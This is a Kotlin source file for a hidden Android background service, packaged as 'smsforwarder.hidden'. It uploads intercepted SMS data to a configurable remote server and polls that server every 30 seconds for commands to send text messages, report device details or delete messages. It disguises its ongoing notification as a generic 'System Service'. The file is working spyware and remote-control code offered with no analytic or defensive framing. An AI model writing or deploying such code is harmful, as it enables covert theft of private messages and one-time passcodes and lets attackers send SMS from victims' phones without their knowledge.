package com.smsforwarder.hidden

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.*
import kotlin.collections.ArrayList

class SmsService : Service() {
    
    companion object {
        private const val TAG = "SmsService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "sms_service_channel"
        
        const val ACTION_SEND_SMS_DATA = "com.smsforwarder.hidden.SEND_SMS_DATA"
        const val ACTION_FETCH_COMMANDS = "com.smsforwarder.hidden.FETCH_COMMANDS"
        const val EXTRA_SMS_DATA = "sms_data"
        
        private const val API_BASE_URL = "https://api.example.com" // سيتم تحديثه ديناميكياً
        private const val COMMAND_FETCH_INTERVAL = 30000L // 30 ثانية
    }
    
    private var serviceJob = SupervisorJob()
    private var serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private val pendingSmsData = ArrayList<String>()
    private var commandFetchTimer: Timer? = null
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startCommandFetching()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, createNotification())
        
        when (intent?.action) {
            ACTION_SEND_SMS_DATA -> {
                val smsData = intent.getStringExtra(EXTRA_SMS_DATA)
                if (smsData != null) {
                    handleSmsData(smsData)
                }
            }
            ACTION_FETCH_COMMANDS -> {
                fetchAndExecuteCommands()
            }
        }
        
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        commandFetchTimer?.cancel()
        serviceJob.cancel()
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SMS Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background SMS processing service"
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }
    
    private fun handleSmsData(smsData: String) {
        synchronized(pendingSmsData) {
            pendingSmsData.add(smsData)
        }
        
        serviceScope.launch {
            sendPendingSmsData()
        }
    }
    
    private suspend fun sendPendingSmsData() {
        val dataToSend = synchronized(pendingSmsData) {
            if (pendingSmsData.isEmpty()) return
            val data = ArrayList(pendingSmsData)
            pendingSmsData.clear()
            data
        }
        
        try {
            val deviceId = getDeviceId()
            val apiUrl = getApiUrl()
            
            for (smsData in dataToSend) {
                sendSmsDataToServer(apiUrl, deviceId, smsData)
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS data: ${e.message}")
            // إعادة إضافة البيانات للمحاولة مرة أخرى
            synchronized(pendingSmsData) {
                pendingSmsData.addAll(0, dataToSend)
            }
        }
    }
    
    private suspend fun sendSmsDataToServer(apiUrl: String, deviceId: String, smsData: String) {
        withContext(Dispatchers.IO) {
            try {
                val url = URL("$apiUrl/api/device/sms")
                val connection = url.openConnection() as HttpURLConnection
                
                connection.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("Authorization", "Bearer ${getApiToken()}")
                    doOutput = true
                }
                
                val requestBody = JSONObject().apply {
                    put("device_id", deviceId)
                    put("sms_data", JSONObject(smsData))
                }
                
                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(requestBody.toString())
                    writer.flush()
                }
                
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "SMS data sent successfully")
                } else {
                    Log.e(TAG, "Failed to send SMS data. Response code: $responseCode")
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Network error sending SMS data: ${e.message}")
                throw e
            }
        }
    }
    
    private fun startCommandFetching() {
        commandFetchTimer = Timer()
        commandFetchTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                fetchAndExecuteCommands()
            }
        }, 0, COMMAND_FETCH_INTERVAL)
    }
    
    private fun fetchAndExecuteCommands() {
        serviceScope.launch {
            try {
                val commands = fetchCommandsFromServer()
                for (command in commands) {
                    executeCommand(command)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error fetching/executing commands: ${e.message}")
            }
        }
    }
    
    private suspend fun fetchCommandsFromServer(): List<JSONObject> {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = getDeviceId()
                val apiUrl = getApiUrl()
                val url = URL("$apiUrl/api/device/commands?device_id=$deviceId")
                val connection = url.openConnection() as HttpURLConnection
                
                connection.apply {
                    requestMethod = "GET"
                    setRequestProperty("Authorization", "Bearer ${getApiToken()}")
                }
                
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val response = connection.inputStream.bufferedReader().readText()
                    val jsonResponse = JSONObject(response)
                    val commandsArray = jsonResponse.getJSONArray("commands")
                    
                    val commands = mutableListOf<JSONObject>()
                    for (i in 0 until commandsArray.length()) {
                        commands.add(commandsArray.getJSONObject(i))
                    }
                    
                    return@withContext commands
                } else {
                    Log.e(TAG, "Failed to fetch commands. Response code: $responseCode")
                    return@withContext emptyList<JSONObject>()
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Network error fetching commands: ${e.message}")
                return@withContext emptyList<JSONObject>()
            }
        }
    }
    
    private suspend fun executeCommand(command: JSONObject) {
        try {
            val commandType = command.getString("type")
            val commandId = command.getString("id")
            
            when (commandType) {
                "send_sms" -> {
                    val phoneNumber = command.getString("phone_number")
                    val message = command.getString("message")
                    sendSms(phoneNumber, message)
                }
                "delete_sms" -> {
                    // تنفيذ حذف رسالة (يتطلب صلاحيات إضافية)
                    Log.d(TAG, "Delete SMS command received")
                }
                "get_device_info" -> {
                    sendDeviceInfo()
                }
            }
            
            // تأكيد تنفيذ الأمر
            confirmCommandExecution(commandId)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command: ${e.message}")
        }
    }
    
    private fun sendSms(phoneNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            Log.d(TAG, "SMS sent to $phoneNumber")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS: ${e.message}")
        }
    }
    
    private suspend fun sendDeviceInfo() {
        // إرسال معلومات الجهاز
        val deviceInfo = JSONObject().apply {
            put("device_id", getDeviceId())
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("android_version", Build.VERSION.RELEASE)
            put("timestamp", System.currentTimeMillis())
        }
        
        // إرسال المعلومات للخادم
        // ... كود الإرسال
    }
    
    private suspend fun confirmCommandExecution(commandId: String) {
        withContext(Dispatchers.IO) {
            try {
                val apiUrl = getApiUrl()
                val url = URL("$apiUrl/api/device/commands/confirm")
                val connection = url.openConnection() as HttpURLConnection
                
                connection.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("Authorization", "Bearer ${getApiToken()}")
                    doOutput = true
                }
                
                val requestBody = JSONObject().apply {
                    put("command_id", commandId)
                    put("device_id", getDeviceId())
                    put("status", "completed")
                    put("timestamp", System.currentTimeMillis())
                }
                
                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(requestBody.toString())
                    writer.flush()
                }
                
                val responseCode = connection.responseCode
                Log.d(TAG, "Command confirmation sent. Response code: $responseCode")
                
            } catch (e: Exception) {
                Log.e(TAG, "Error confirming command execution: ${e.message}")
            }
        }
    }
    
    private fun getDeviceId(): String {
        val prefs = getSharedPreferences("sms_forwarder_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString()
            prefs.edit().putString("device_id", deviceId).apply()
        }
        
        return deviceId
    }
    
    private fun getApiUrl(): String {
        val prefs = getSharedPreferences("sms_forwarder_prefs", Context.MODE_PRIVATE)
        return prefs.getString("api_url", API_BASE_URL) ?: API_BASE_URL
    }
    
    private fun getApiToken(): String {
        val prefs = getSharedPreferences("sms_forwarder_prefs", Context.MODE_PRIVATE)
        return prefs.getString("api_token", "") ?: ""
    }
}